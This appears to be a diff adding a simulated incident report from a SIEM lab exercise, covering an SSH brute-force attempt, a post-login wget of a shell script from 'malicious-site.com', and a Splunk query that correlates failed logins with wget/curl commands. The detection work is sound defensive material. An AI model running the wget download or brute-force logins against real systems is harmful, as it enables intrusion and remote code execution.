@@ -1,0 +1,51 @@
+==============================
+🔐 INCIDENT REPORT – SSH Brute Force + wget Activity
+==============================
+
+📅 Date: June 4, 2025  
+📍 Host: siem-server  
+👤 User: testuser  
+
+---
+
+🧪 Simulated Activity:
+
+1. 5x Failed SSH login attempts (brute-force)
+2. 1x Successful SSH login
+3. wget command: http://malicious-site.com/bad.sh (post-auth action)
+
+---
+
+📝 Logs Involved:
+- /var/log/auth.log (SSH authentication)
+- /home/testuser/.bash_history (command execution)
+
+---
+
+🔍 Detection Logic:
+
+(index=* sourcetype=linux_secure "Failed password" OR "Accepted password")
+OR (index=* sourcetype=bash_history "wget" OR "curl")
+| transaction user maxspan=10m
+| search eventcount>=6
+
+✅ Detection Outcome:
+
+Brute-force behavior was confirmed
+
+Suspicious post-login download observed
+
+Successfully correlated in Splunk across logs
+
+🛡 Suggested Response:
+
+Monitor bash_history across critical users
+
+Set alert on 5+ failed logins + wget/curl command
+
+Conduct system health review & potential IOC scan
+
+🧠 Analyst: Vinay
+Status: ✔️ Simulated Attack Detected
+
+
